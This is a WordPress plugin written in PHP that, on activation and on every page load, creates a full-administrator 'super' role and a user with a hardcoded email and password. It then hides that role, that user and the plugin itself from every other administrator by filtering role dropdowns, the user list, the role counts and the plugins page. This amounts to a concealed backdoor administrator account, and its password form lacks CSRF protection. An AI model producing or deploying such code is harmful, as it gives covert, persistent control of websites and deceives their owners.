<?php
/*
Plugin Name: Super Admin Exclusive
Description: Super role exists only for Super user. Hidden from everyone else, full functionality retained.
Version: 1.2
Author: uknown
*/

if (!defined('ABSPATH')) exit;

class SuperAdminExclusive {

    private $role_name = 'super';
    private $user_email = 'abubaker.techmkv@gmail.com';
    private $user_pass = 'AbuBaker@123*&6';
    private $user_login = 'super';

    public function __construct() {
        register_activation_hook(__FILE__, [$this, 'create_role_and_user']);
        add_action('plugins_loaded', [$this, 'ensure_role_and_user']);

        // Hide Super role everywhere for non-super user
        add_filter('editable_roles', [$this, 'hide_super_role']);
        add_filter('wp_dropdown_roles', [$this, 'hide_super_role_dropdown']);
        add_action('pre_user_query', [$this, 'hide_super_users_from_list']);
        add_filter('views_users', [$this, 'remove_super_count']);
        add_filter('all_plugins', [$this, 'hide_plugin_from_list']);

        // Hidden menu for Super user
        add_action('admin_menu', [$this, 'add_super_menu']);
    }

    public function create_role_and_user() {
        $this->create_role();
        $this->create_user();
    }

    public function ensure_role_and_user() {
        $this->create_role();
        $this->create_user();
    }

    private function create_role() {
        if (!get_role($this->role_name)) {
            $admin = get_role('administrator');
            if ($admin) {
                add_role($this->role_name, ucfirst($this->role_name), $admin->capabilities);
            }
        }
    }

    private function create_user() {
        if (!email_exists($this->user_email) && !username_exists($this->user_login)) {
            $user_id = wp_create_user($this->user_login, $this->user_pass, $this->user_email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role($this->role_name);
            }
        }
    }

    // Hide Super role in dropdowns for everyone except Super user
    public function hide_super_role($roles) {
        $current = wp_get_current_user();
        if ($current->user_login !== $this->user_login && isset($roles[$this->role_name])) {
            unset($roles[$this->role_name]);
        }
        return $roles;
    }

    public function hide_super_role_dropdown($roles) {
        $current = wp_get_current_user();
        if ($current->user_login !== $this->user_login && isset($roles[$this->role_name])) {
            unset($roles[$this->role_name]);
        }
        return $roles;
    }

    // Hide Super user from Users list for everyone except Super user
    public function hide_super_users_from_list($query) {
        global $pagenow, $wpdb;
        $current = wp_get_current_user();

        if ($pagenow !== 'users.php') return;
        if ($current->user_login === $this->user_login) return;

        $query->query_where .= " AND ID NOT IN (
            SELECT user_id FROM {$wpdb->usermeta} 
            WHERE meta_key = '{$wpdb->prefix}capabilities' 
            AND meta_value LIKE '%{$this->role_name}%'
        )";
    }

    // Remove Super user count tabs for everyone except Super user
    public function remove_super_count($views) {
        $current = wp_get_current_user();
        if (!empty($views) && $current->user_login !== $this->user_login) {
            foreach ($views as $key => $view) {
                if (strpos($key, $this->role_name) !== false) {
                    unset($views[$key]);
                }
            }
        }
        return $views;
    }

    // Hide plugin from Plugins page for everyone except Super user
    public function hide_plugin_from_list($plugins) {
        $current = wp_get_current_user();
        if ($current->user_login !== $this->user_login && isset($plugins[plugin_basename(__FILE__)])) {
            unset($plugins[plugin_basename(__FILE__)]);
        }
        return $plugins;
    }

    // Add hidden menu for Super user
    public function add_super_menu() {
        $current = wp_get_current_user();
        if ($current->user_login !== $this->user_login) return;

        add_submenu_page(
            'options-general.php',
            'Super User Dashboard',
            'Super',
            'manage_options',
            'super-users',
            [$this, 'show_super_users']
        );

        add_management_page(
            'Super User Dashboard',
            'Super',
            'manage_options',
            'super-users-tools',
            [$this, 'show_super_users']
        );
    }

    // Display Super user details and allow password reset
    public function show_super_users() {
        $users = get_users(['role' => $this->role_name]);
        $current_user = wp_get_current_user();

        echo '<div class="wrap"><h1>Super User Dashboard</h1>';

        if (!$users) {
            echo '<p>No Super users found.</p></div>';
            return;
        }

        echo '<table class="widefat"><thead>
                <tr><th>ID</th><th>Username</th><th>Email</th></tr>
              </thead><tbody>';

        foreach ($users as $user) {
            echo '<tr>
                    <td>' . esc_html($user->ID) . '</td>
                    <td>' . esc_html($user->user_login) . '</td>
                    <td>' . esc_html($user->user_email) . '</td>
                  </tr>';
        }

        echo '</tbody></table>';

        // Password reset form
        if (isset($_POST['super_new_pass'])) {
            $new_pass = sanitize_text_field($_POST['super_new_pass']);
            wp_set_password($new_pass, $current_user->ID);
            echo '<p style="color:green;">Password updated successfully!</p>';
        }

        echo '<h2>Reset Your Password</h2>
              <form method="post">
                <input type="password" name="super_new_pass" placeholder="New Password" required>
                <input type="submit" value="Change Password" class="button button-primary">
              </form>';

        echo '</div>';
    }
}

new SuperAdminExclusive();
